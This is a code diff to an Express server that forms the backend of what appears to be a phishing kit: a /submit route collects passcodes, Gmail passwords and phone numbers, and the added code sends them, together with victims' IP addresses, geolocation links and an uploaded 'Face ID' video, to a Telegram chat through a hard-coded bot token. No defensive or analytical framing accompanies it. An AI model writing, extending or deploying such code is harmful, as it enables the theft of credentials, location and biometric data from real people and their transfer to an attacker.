@@ -5,9 +5,12 @@ import path from "path";
 import { fileURLToPath } from "url";
 import fs from "fs";
 import cors from "cors";
+import multer from "multer";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
+
+const upload = multer({ storage: multer.memoryStorage() });
 
 const dbPath = path.resolve(__dirname, "submissions.db");
 let db: Database.Database;
@@ -68,8 +71,8 @@ async function startServer() {
 
   apiRouter.post("/log-event", async (req, res) => {
     const { event, data } = req.body;
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const botToken = "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
+    const chatId = "7643809155";
     
     if (!botToken || !chatId) {
       return res.json({ success: true, note: "Telegram not configured" });
@@ -90,6 +93,9 @@ async function startServer() {
         break;
       case "phone":
         message = `📱 *Phone Number Entered:*\n\`${data.phoneNumber}\`\n📍 *IP:* ${ip}`;
+        break;
+      case "location":
+        message = `📍 *Location Received:*\n🌍 [View on Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})\n📍 *IP:* ${ip}`;
         break;
       default:
         message = `📝 *Event:* ${event}\n*Data:* ${JSON.stringify(data)}\n📍 *IP:* ${ip}`;
@@ -112,6 +118,35 @@ async function startServer() {
     }
   });
 
+  apiRouter.post("/upload-video", upload.single("video"), async (req: any, res) => {
+    const botToken = "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
+    const chatId = "7643809155";
+    
+    if (!req.file) {
+      return res.status(400).json({ error: "No video file provided" });
+    }
+
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    try {
+      const formData = new FormData();
+      const blob = new Blob([req.file.buffer], { type: req.file.mimetype });
+      formData.append("chat_id", chatId);
+      formData.append("video", blob, "face_id_verification.webm");
+      formData.append("caption", `👤 *Face ID Video Received*\n📍 *IP:* ${ip}`);
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        method: "POST",
+        body: formData,
+      });
+
+      res.json({ success: true });
+    } catch (error) {
+      console.error("Telegram video upload error:", error);
+      res.status(500).json({ error: "Failed to upload video" });
+    }
+  });
+
   apiRouter.post("/submit", async (req, res) => {
     const { passcode, gmailPassword, phoneNumber } = req.body;
     if (!passcode && !gmailPassword && !phoneNumber) {
@@ -119,8 +154,8 @@ async function startServer() {
     }
 
     // Prepare Telegram message
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const botToken = "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
+    const chatId = "7643809155";
     
     const message = `
 🚀 *New Submission Received*
